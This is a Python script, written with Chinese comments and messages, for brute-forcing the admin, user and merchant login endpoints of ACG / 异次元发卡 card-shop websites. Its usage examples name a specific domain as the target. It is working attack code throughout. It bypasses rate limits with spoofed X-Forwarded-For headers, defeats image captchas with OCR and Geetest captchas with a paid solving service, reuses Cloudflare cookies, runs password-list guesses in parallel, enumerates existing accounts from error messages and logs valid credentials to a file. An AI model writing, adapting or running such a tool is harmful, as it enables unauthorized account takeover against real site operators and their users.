#!/usr/bin/env python3
"""
ACG / 异次元发卡后台 JSON 登录爆破（支持 XFF 绕过、ddddocr 验证码、Geetest 2captcha）。

示例:
  # zhanghao9 后台（admin 无验证码）
  python3 acg_login_brute.py -u https://zhanghao9.com \\
    -e /data/wordlists/faka/faka-emails.txt \\
    -p /data/wordlists/chinese-passwords.txt --limit-pass 5000 -w 20 --xff

  # 用户端（自动 OCR 验证码）
  python3 acg_login_brute.py -u https://zhanghao9.com --endpoint user -e emails.txt -p rockyou_slice.txt

  # Geetest 登录（需 2captcha key）
  python3 acg_login_brute.py -u https://TARGET --endpoint merchant --email admin --password pass --geetest
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import (
    DEFAULT_UA,
    add_pythonpath,
    apply_session,
    ensure_out,
    json_or_text,
    load_wordlist,
    log,
    random_xff_headers,
    resolve_proxy,
    save_hit,
)

ENDPOINTS = {
    "admin": "/admin/api/authentication/login",
    "user": "/user/api/authentication/login",
    "merchant": "/merchantApi/user/login",
}

CAPTCHA_PATHS = [
    "/user/captcha/image?action=login",
    "/user/captcha/image",
    "/user/api/captcha/image",
]


def get_ocr():
    add_pythonpath()
    try:
        import ddddocr

        return ddddocr.DdddOcr(show_ad=False)
    except Exception as e:
        raise SystemExit(f"ddddocr 不可用: {e}")


def load_geetest_solver():
    mod_path = Path("/data/recon/cookie_tool/rev/geetest_2captcha.py")
    if not mod_path.exists():
        return None
    spec = importlib.util.spec_from_file_location("geetest_2captcha", mod_path)
    if not spec or not spec.loader:
        return None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def fetch_captcha(s: requests.Session, base: str, timeout: int) -> str:
    ocr = get_ocr()
    for path in CAPTCHA_PATHS:
        url = base.rstrip("/") + path
        try:
            r = s.get(url, timeout=timeout)
            if r.status_code == 200 and r.content and len(r.content) > 100:
                text = ocr.classification(r.content)
                return re.sub(r"[^a-zA-Z0-9]", "", text)[:6]
        except Exception:
            continue
    return ""


def solve_geetest_login(base: str, page_path: str, timeout: int) -> dict[str, str]:
    solver = load_geetest_solver()
    if not solver:
        raise RuntimeError("缺少 geetest_2captcha.py 或 2captcha key")
    s = requests.Session()
    s.verify = False
    pageurl = base.rstrip("/") + page_path
    r = s.get(pageurl, timeout=timeout)
    html = r.text
    gt_m = re.search(r'gt["\']?\s*[:=]\s*["\']([a-f0-9]+)', html, re.I)
    ch_m = re.search(r'challenge["\']?\s*[:=]\s*["\']([a-f0-9]+)', html, re.I)
    if not gt_m or not ch_m:
        raise RuntimeError("页面未找到 Geetest gt/challenge")
    result = solver.solve_geetest_v3(gt=gt_m.group(1), challenge=ch_m.group(1), pageurl=pageurl)
    return result


def try_login(
    base: str,
    endpoint: str,
    email: str,
    password: str,
    timeout: int,
    proxy: str,
    use_xff: bool,
    captcha: str,
    cf_cookies: str = "",
    use_geetest: bool = False,
    ocr_session: requests.Session | None = None,
) -> tuple[bool, Any]:
    url = base.rstrip("/") + endpoint
    headers = {"User-Agent": DEFAULT_UA, "Content-Type": "application/json"}
    if use_xff:
        headers.update(random_xff_headers())

    geetest_payload: dict[str, str] = {}
    if use_geetest:
        try:
            geetest_payload = solve_geetest_login(base, "/merchant/login" if endpoint == ENDPOINTS["merchant"] else "/user/authentication/login", timeout)
        except Exception as e:
            return False, {"status": "geetest_fail", "msg": str(e)}

    if endpoint == ENDPOINTS["merchant"]:
        payload = {"username": email, "password": password, **geetest_payload}
    elif endpoint == ENDPOINTS["user"]:
        if not captcha and ocr_session is not None:
            captcha = fetch_captcha(ocr_session, base, timeout)
        payload = {"username": email, "password": password, "captcha": captcha}
    else:
        payload = {"username": email, "password": password}

    proxies = {"http": proxy, "https": proxy} if proxy else None
    s = requests.Session()
    s.verify = False
    s.headers.update(headers)
    apply_session(s, proxy, use_xff, cf_cookies)
    try:
        r = s.post(url, json=payload, timeout=timeout, proxies=proxies, verify=False)
        data = json_or_text(r)
        if not isinstance(data, dict):
            return False, data
        code = data.get("code")
        msg = str(data.get("msg", ""))
        if code in (1, 200) or data.get("data"):
            if any(x in msg for x in ("成功", "success", "token", "登录成功")):
                return True, data
            if isinstance(data.get("data"), dict) and data["data"].get("token"):
                return True, data
        if any(x in msg for x in ("密码", "password", "错误", "不正确")):
            return False, {"status": "bad_password", "msg": msg}
        if any(x in msg for x in ("不存在", "not exist", "未注册")):
            return False, {"status": "no_user", "msg": msg}
        if "验证码" in msg:
            return False, {"status": "bad_captcha", "msg": msg}
        return False, data
    except Exception as e:
        return False, str(e)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="ACG 后台登录爆破")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--endpoint", choices=ENDPOINTS.keys(), default="admin")
    ap.add_argument("-e", "--emails", default="/data/wordlists/faka/faka-emails.txt")
    ap.add_argument("--email", default="", help="单个邮箱/用户名，优先")
    ap.add_argument("-p", "--passwords", default="/data/wordlists/chinese-passwords.txt")
    ap.add_argument("--offset-email", type=int, default=0)
    ap.add_argument("--offset-pass", type=int, default=0)
    ap.add_argument("--limit-email", type=int, default=0)
    ap.add_argument("--limit-pass", type=int, default=0)
    ap.add_argument("-w", "--workers", type=int, default=20)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--geetest", action="store_true", help="merchant/user Geetest via 2captcha")
    ap.add_argument("--stop-on-user-found", action="store_true", help="发现账号存在后只打该号")
    ap.add_argument("--cf-cookies", default="", help="cf_session.py 输出的 cookie json")
    ap.add_argument("--out", default="/data/tools/faka/out/login_hits.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    endpoint = ENDPOINTS[args.endpoint]
    proxy = resolve_proxy(args.proxy)

    if args.email:
        emails = [args.email]
    else:
        emails = list(load_wordlist(args.emails, offset=args.offset_email, limit=args.limit_email or None))

    passwords = list(load_wordlist(args.passwords, offset=args.offset_pass, limit=args.limit_pass or None))
    log(f"目标 {args.url}{endpoint} | emails={len(emails):,} passwords={len(passwords):,} workers={args.workers} proxy={'yes' if proxy else 'direct'}")

    valid_users: set[str] = set()
    hits = 0
    start = time.time()
    ocr_session = requests.Session() if args.endpoint == "user" else None
    if ocr_session:
        ocr_session.verify = False
        ocr_session.headers.update({"User-Agent": DEFAULT_UA})
        apply_session(ocr_session, proxy, args.xff, args.cf_cookies)

    for email in emails:
        if args.stop_on_user_found and valid_users and email not in valid_users:
            continue

        def task(pw: str):
            return pw, try_login(
                args.url, endpoint, email, pw, args.timeout, proxy, args.xff,
                "", args.cf_cookies, args.geetest, ocr_session,
            )

        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = {ex.submit(task, pw): pw for pw in passwords}
            for fut in as_completed(futs):
                pw, (ok, data) = fut.result()
                if ok:
                    hits += 1
                    save_hit(Path(args.out), "login_ok", {"url": args.url, "email": email, "password": pw, "resp": data})
                    log(f"[+] LOGIN {email}:{pw}")
                    break
                if isinstance(data, dict) and data.get("status") == "bad_password":
                    valid_users.add(email)
                if isinstance(data, dict) and data.get("status") == "no_user":
                    log(f"[-] 账号不存在: {email}")
                    break

    elapsed = time.time() - start
    log(f"完成 hits={hits} valid_users={len(valid_users)} {elapsed:.1f}s -> {args.out}")


if __name__ == "__main__":
    main()
